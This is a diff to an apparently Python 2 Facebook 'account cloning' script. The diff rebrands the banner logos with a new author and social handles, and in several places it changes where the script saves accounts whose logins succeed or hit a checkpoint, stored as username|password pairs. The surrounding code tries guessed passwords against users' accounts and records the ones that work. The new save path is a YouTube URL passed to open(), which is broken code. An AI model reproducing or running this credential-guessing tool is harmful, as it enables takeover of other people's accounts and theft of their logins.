@@ -98,16 +98,14 @@ vuln = "\033[32mVuln"
 os.system("clear")
 #### logo ####
 logo='''
-\033[1;93m_____ _____ _____  _   _    ___  _________  ___
-\033[1;94m|_   _|  ___/  __ \| | | |  / _ \ | ___ \  \/  |
-\033[1;93m  | | | |__ | /  \/| |_| | / /_\ \| |_/ / .  . |
-\033[1;94m  | | |  __|| |    |  _  | |  _  || ___ \ |\/| |
-\033[1;93m  | | | |___| \__/\| | | | | | | || |_/ / |  | |
-\033[1;94m  \_/ \____/ \____/\_| |_/ \_| |_/\____/\_|  |_/
+\033[1;95m┏┓︱┏┓︱︱︱︱┏┳┓︱︱︱︱︱︱︱︱┏┓︱︱︱︱ \033[1;96m ︱┏┓︱︱︱︱︱︱︱︱
+\033[1;95m┃┗┓┣┫┏━┳┓┃┃┃┏━┓︱┏━━┓┣┫┏━┳┓  \033[1;96m︱┣┫┏━┓︱┏━┳┓
+\033[1;95m┃╋┃┃┃┃┃┃┃┣┓┃┃╋┗┓┃┃┃┃┃┃┃┃┃┃ \033[1;96m┏┛┃┃╋┗┓┃┃┃┃
+\033[1;95m┗━┛┗┛┗┻━┛┗━┛┗━━┛┗┻┻┛┗┛┗┻━┛ \033[1;96m┗━┛┗━━┛┗┻━┛
 \033[1;92m--------------------------------------------------
-\033[1;97m➣ Author   : Tech Abm
-\033[1;97m➣ GitHub   : https://github.com/Tech-abm
-\033[1;97m➣ Fb Page  : https://m.facebook.com/Techabm
+\033[1;97m➣ Author   : Binyamin Jan
+\033[1;97m➣ Youtube   : Search On Youtube Binyamin jan 
+\033[1;97m➣ Telegram  : @Binyamin001
 \033[1;92m--------------------------------------------------
                                 ''' 
 logo2='''
@@ -132,9 +130,9 @@ logo2='''
 \033[1;94m$R@i.~~ !     :   ~$$$$$B$$en:``
 \033[1;93m?MXT@Wx.~    :     ~"##*$$$$M~
 \033[1;92m--------------------------------------------------
-\033[1;97m➣ Author   : Tech Abm
-\033[1;97m➣ GitHub   : https://github.com/Tech-abm
-\033[1;97m➣ Fb Page  : https://m.facebook.com/Techabm
+\033[1;97m➣ Author   : Binyamin Jan
+\033[1;97m➣ Youtube   : Search On Youtube Binyamin Jan
+\033[1;97m➣ Telegram  : @Binyamin001
 \033[1;92m--------------------------------------------------
                                 '''                                
 logo3='''
@@ -157,9 +155,9 @@ logo3='''
 \033[1;96m    `OOOOI,,,IOOOO'    \033[1;93m     `OOOOI,,,IOOOO'   
 \033[1;96m     `OOOOOOOOOOO'     \033[1;93m      `OOOOOOOOOOO'         
 \033[1;92m--------------------------------------------------
-\033[1;97m➣ Author   : Tech Abm
-\033[1;97m➣ GitHub   : https://github.com/Tech-abm
-\033[1;97m➣ Fb Page  : https://m.facebook.com/Techabm
+\033[1;97m➣ Author   :Binyamin Jan
+\033[1;97m➣ Youtube  :Search On youtube Binyamin Jan
+\033[1;97m➣ Telegram  : @Binyamin001
 \033[1;92m--------------------------------------------------
                                 '''                                
 logo4='''
@@ -186,9 +184,9 @@ logo4='''
 \033[1;93m      ;                            ;;+_  :::. :..;;;
  \033[1;94m                                  ;;;;;;,;;;;;;;;,;
 \033[1;92m--------------------------------------------------
-\033[1;97m➣ Author   : Tech Abm
-\033[1;97m➣ GitHub   : https://github.com/Tech-abm
-\033[1;97m➣ Fb Page  : https://m.facebook.com/Techabm
+\033[1;97m➣ Author   : Binyamin Jan
+\033[1;97m➣ Youtube   : Search On Youtube Binyamin Jan
+\033[1;97m➣ Telegram  : @Binyamin001
 \033[1;92m--------------------------------------------------
                                 '''                                
                                
@@ -349,14 +347,14 @@ def action():
 			q = json.load(data)
 			if 'access_token' in q:
 				print '\033[1;92m[\033[1;92mSuccessfully\033[1;97m]  ' + k + c + user + '  |  ' + pass1
-				okb = open('techabm/clone.txt', 'a')
+				okb = open('https://youtu.be/OJb1gO7KMrc', 'a')
 				okb.write(k+c+user+'|'+pass1+'\n')
 				okb.close()
 				oks.append(c+user+pass1)
 			else:
 				if 'www.facebook.com' in q['error_msg']:
 					print '\033[1;97m[\033[1;93mCheckpoint\033[1;97m]  ' + k + c + user + '  |  ' + pass1
-					cps = open('techabm/clone.txt', 'a')
+					cps = open('https://youtu.be/OJb1gO7KMrc', 'a')
 					cps.write(k+c+user+'|'+pass1+'\n')
 					cps.close()
 					cpb.append(c+user+pass1)
@@ -366,14 +364,14 @@ def action():
  				    q = json.load(data)
  				    if 'access_token' in q:
  				        print '\033[1;92m[\033[1;92mSuccessfully\033[1;97m]  ' + k + c + user +  '  |  ' + pass2
- 				        okb = open('techabm/clone.txt', 'a')
+ 				        okb = open('https://youtu.be/OJb1gO7KMrc', 'a')
  				        okb.write(k+c+user+'|'+pass2+'\n')
  				        okb.close()
  				        oks.append(c+user+pass2)
  				    else:
  				        if 'www.facebook.com' in q['error_msg']:
  					        print '\033[1;97m[\033[1;93mCheckpoint\033[1;97m]  ' + k + c + user + '  |  ' + pass2
- 					        cps = open('techabm/clone.txt', 'a')
+ 					        cps = open('https://youtu.be/OJb1gO7KMrc', 'a')
  					        cps.write(k+c+user+'|'+pass2+'\n')
  					        cps.close()
  					        cpb.append(c+user+pass2)
@@ -387,7 +385,7 @@ def action():
     print "\033[1;97m--------------------------------------------------"
     print '[✓] Process Has Been Completed ...'
     print '[✓] Total Successfully/Checkpoint : '+str(len(oks))+'/'+str(len(cpb))
-    print('[✓] Cloned Accounts Has Been Saved : techabm/clone.txt') 
+    print('[✓] Cloned Accounts Has Been Saved : binyamin/clone.txt') 
     raw_input("\n\033[1;97m[\033[1;97mPress Enter Go Back\033[1;95m]")
     print "\033[1;97m--------------------------------------------------"
     menu() 
